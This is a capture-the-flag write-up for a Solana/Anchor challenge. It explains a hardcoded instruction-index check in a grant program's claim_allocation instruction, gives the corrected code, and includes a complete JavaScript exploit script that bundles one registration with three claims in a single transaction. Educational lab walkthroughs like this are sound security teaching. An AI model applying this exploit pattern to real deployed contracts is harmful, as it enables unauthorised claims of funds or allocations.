# Grant Registry

Prepared By: `Eyetologist`

Challenge Author(s): `Eyetologist`

Difficulty: Easy

<br>

# Synopsis

The `claim_allocation` instruction checks that `register_eligibility` was called in the same transaction. But it does this by always looking at instruction index 0, not the instruction that came right before it. So if you put `register_eligibility` at index 0, every `claim_allocation` in the same transaction will pass the check. Send one registration and three claims in a single transaction to get 3 allocations and solve the challenge.

## Description

The rival coalition doesn't move money through banks anymore. Not for anything that matters. Procurement approvals, infrastructure grants, vendor certifications, subsidy clearances: all of it runs through the Grant Registry, an on-chain authority that the opposing state spent two years quietly making indispensable. If your organization isn't registered in it, you don't get funded. If your allocation isn't signed by it, it doesn't clear. They built dependency first, then built the walls around it.

Task Force Nightfall has been watching the registry for weeks. It sits at the center of the rival coalition's fiscal coordination layer, the kind of system that if you can touch it, gives you options that no amount of diplomatic pressure ever would. Not disruption. Not spectacle. Access. The kind that shapes what gets approved, what gets certified, and what gets quietly held back.

Intel suggests the registry has a flaw somewhere in how it validates operator eligibility. The details are yours to find.

## Skill Required

- Basic Solana / Anchor knowledge (accounts, PDAs, instructions)
- Understanding of the Solana instruction sysvar
- How to build a transaction with multiple instructions
- Using web3.js or the Anchor client to interact with Solana

## Skills Learned

- How absolute vs. relative instruction indexing works in Solana's instruction sysvar
- Exploiting a hardcoded index check to bypass a one-per-registration guard
- Packing multiple instructions into one transaction so an early instruction satisfies all later checks

# Enumeration

## Analyzing the Source Code

The challenge has one Anchor program (`setup/programs/grant_registry/src/lib.rs`) and two test scripts used by the server.

---

### Files

- **`programs/grant_registry/src/lib.rs`**: The on-chain program
  - Has four instructions: `initialize`, `register_eligibility`, `claim_allocation`, `is_solved`
  - Tracks two account types: `PlayerState` (stores your allocation count) and `EligibilityRecord` (a PDA that marks you as registered)
  - Win condition: `allocations >= 3`

- **`tests/setup.ts`**: Runs when your instance starts
  - Calls `initialize` to create a fresh `PlayerState` account for you
  - The address of this account is given to you as `CTX_PUBKEY`

- **`tests/is_solved.ts`**: Runs when you click the flag button
  - Calls `is_solved` to check if your allocation count is high enough

- **`solve/solve.js`**: The reference exploit

---

#### `lib.rs`

- **`initialize`**
  - Creates a `PlayerState` account and sets `allocations = 0`
  - Called once by the server when your instance is created

- **`register_eligibility`**
  - Creates an `EligibilityRecord` PDA at `[b"eligibility", your_wallet]`
  - A PDA (Program Derived Address) is a special account address owned by the program. Since it's derived from your wallet, only one can exist per wallet. Trying to register twice will fail.

- **`claim_allocation`**
  - Checks that the instruction at index 0 of the transaction is `register_eligibility`
  - If the check passes, adds 1 to your `allocations`
  - **This is the vulnerable instruction**

- **`is_solved`**
  - Returns `true` if `allocations >= 3`

---

#### Account Structures

```
PlayerState  (8 + 8 bytes)
  └── allocations: u64

EligibilityRecord  (8 + 32 + 1 bytes)
  ├── owner:  Pubkey
  └── active: bool
      seeds = [b"eligibility", applicant.key()]
```

---

#### What the Program Is Supposed to Do

| Rule                              | How it's enforced                              |
| --------------------------------- | ---------------------------------------------- |
| One eligibility record per wallet | PDA is unique per wallet                       |
| One allocation per registration   | Instruction sysvar check in `claim_allocation` |
| Need 3 allocations to win         | `is_solved` checks `allocations >= 3`          |

The PDA rule works fine. The sysvar check does not.

# Solution

## Finding the Vulnerability

**Quick background for beginners:** In Solana, a single transaction can contain multiple instructions that all execute together. There is a special account called the instruction sysvar that lets a running instruction look at all the other instructions in the same transaction. This is often used to enforce rules like "instruction B can only run if instruction A also ran in this transaction."

**In `lib.rs` (`claim_allocation`):**

```rust
pub fn claim_allocation(ctx: Context<ClaimAllocation>) -> Result<()> {
    let sysvar = ctx.accounts.instruction_sysvar.to_account_info();

    let preceding_ix = ix_utils::load_instruction_at_checked(0usize, &sysvar)?;

    require_keys_eq!(
        preceding_ix.program_id,
        crate::ID,
        GrantError::EligibilityNotFound
    );

    require!(
        preceding_ix.data.len() >= 8
            && preceding_ix.data[..8] == anchor_disc("register_eligibility"),
        GrantError::EligibilityNotFound
    );

    ctx.accounts.player_state.allocations = ctx
        .accounts
        .player_state
        .allocations
        .checked_add(1)
        .unwrap();

    Ok(())
}
```

**What's wrong**

The line `load_instruction_at_checked(0usize, &sysvar)` always loads instruction at index 0. It never checks what position the current `claim_allocation` is running at.

The intent was: _"make sure the instruction right before this one was `register_eligibility`."_

What it actually does: _"make sure instruction 0 in this transaction is `register_eligibility`."_

Because all instructions in a transaction share the same sysvar snapshot, every `claim_allocation` in the transaction reads the same absolute index 0. Put `register_eligibility` first and it satisfies the guard for every `claim_allocation` that follows, no matter how many you add.

The fix would be to get the current instruction's index first, then look at the one before it:

```rust
let current_index = ix_utils::load_current_index_checked(&sysvar)? as usize;
let preceding_ix  = ix_utils::load_instruction_at_checked(current_index - 1, &sysvar)?;
```

---

**The exploit**

Build one transaction with four instructions:

```
ix[0]: register_eligibility   <- creates the PDA (enforced one-time by PDA uniqueness)
ix[1]: claim_allocation       <- checks ix[0] -> register_eligibility pass -> allocations = 1
ix[2]: claim_allocation       <- checks ix[0] -> register_eligibility pass -> allocations = 2
ix[3]: claim_allocation       <- checks ix[0] -> register_eligibility pass -> allocations = 3
```

One transaction. One registration. Three allocations. Done.

---

## Exploitation

```javascript
const anchor = require("@coral-xyz/anchor");
const bs58 = require("bs58");
const {
  SystemProgram,
  Keypair,
  PublicKey,
  Transaction,
  SYSVAR_INSTRUCTIONS_PUBKEY,
} = anchor.web3;

const RPC_URL = process.env.RPC_URL || "Your RPC URL";
const PLAYER_KP_B58 = process.env.PLAYER_KP || "Your Player KP";
const CTX_PUBKEY = process.env.CTX_PUBKEY || "Your Pubkey";
const PROGRAM_ID = process.env.PROGRAM_ID || "your Program ID";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function sendAndConfirmOverHttp(connection, tx, signer) {
  const { blockhash, lastValidBlockHeight } =
    await connection.getLatestBlockhash("confirmed");
  tx.feePayer = signer.publicKey;
  tx.recentBlockhash = blockhash;
  tx.sign(signer);

  const sig = await connection.sendRawTransaction(tx.serialize(), {
    skipPreflight: false,
    preflightCommitment: "confirmed",
    maxRetries: 5,
  });

  for (;;) {
    const status = (await connection.getSignatureStatuses([sig])).value[0];

    if (status?.err) {
      throw new Error(`transaction failed: ${JSON.stringify(status.err)}`);
    }

    if (
      status &&
      (status.confirmationStatus === "confirmed" ||
        status.confirmationStatus === "finalized")
    ) {
      return sig;
    }

    const currentBlockHeight = await connection.getBlockHeight("confirmed");
    if (currentBlockHeight > lastValidBlockHeight) {
      throw new Error(`transaction expired before confirmation: ${sig}`);
    }

    await sleep(1000);
  }
}

const main = async () => {
  const connection = new anchor.web3.Connection(RPC_URL, "confirmed");
  const playerKeypair = Keypair.fromSecretKey(bs58.decode(PLAYER_KP_B58));
  const wallet = new anchor.Wallet(playerKeypair);
  const provider = new anchor.AnchorProvider(connection, wallet, {
    commitment: "confirmed",
  });
  anchor.setProvider(provider);

  const programId = new PublicKey(PROGRAM_ID);
  const program = await anchor.Program.at(programId, provider);
  const playerStatePk = new PublicKey(CTX_PUBKEY);

  const alreadySolved = await program.methods
    .isSolved()
    .accounts({ playerState: playerStatePk })
    .view({ commitment: "confirmed" });

  if (alreadySolved) {
    console.log("Challenge is already solved for this player state.");
    return;
  }

  const [eligibilityPda] = PublicKey.findProgramAddressSync(
    [Buffer.from("eligibility"), playerKeypair.publicKey.toBuffer()],
    programId,
  );
  console.log("Player pubkey   :", playerKeypair.publicKey.toBase58());
  console.log("Eligibility PDA :", eligibilityPda.toBase58());
  console.log("Player state    :", playerStatePk.toBase58());

  const registerIx = await program.methods
    .registerEligibility()
    .accounts({
      eligibilityRecord: eligibilityPda,
      applicant: playerKeypair.publicKey,
      systemProgram: SystemProgram.programId,
    })
    .instruction();

  const claimIx = await program.methods
    .claimAllocation()
    .accounts({
      playerState: playerStatePk,
      eligibilityRecord: eligibilityPda,
      applicant: playerKeypair.publicKey,
      instructionSysvar: SYSVAR_INSTRUCTIONS_PUBKEY,
    })
    .instruction();

  const tx = new Transaction();
  tx.add(registerIx);
  tx.add(claimIx);
  tx.add(claimIx);
  tx.add(claimIx);

  console.log("\nSending exploit transaction ...");
  const sig = await sendAndConfirmOverHttp(connection, tx, playerKeypair);
  console.log("Exploit tx :", sig);

  let solved = false;
  while (!solved) {
    solved = await program.methods
      .isSolved()
      .accounts({ playerState: playerStatePk })
      .view({ commitment: "finalized" });

    if (solved) {
      console.log("\nChallenge solved! Submit the flag from the server.");
    } else {
      console.log("Not yet solved, retrying ...");
      await new Promise((r) => setTimeout(r, 1000));
    }
  }
};

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
```

**How to run it**

Fill in the four values from your challenge instance, then:

```bash
node solve.js
```

Or pass them directly as environment variables:

```bash
RPC_URL=http://<host>/rpc/<uuid> \
PLAYER_KP=<your_private_key> \
CTX_PUBKEY=<player_state_address> \
PROGRAM_ID=<program_address> \
node solve.js
```

### Getting the Flag

Once `isSolved()` returns `true`:

```bash
curl http://<host>/flag/<uuid>
```

Or click the **EXFIL INTEL** button on the challenge UI.

**Flag:** `HTB{REDACTED}`
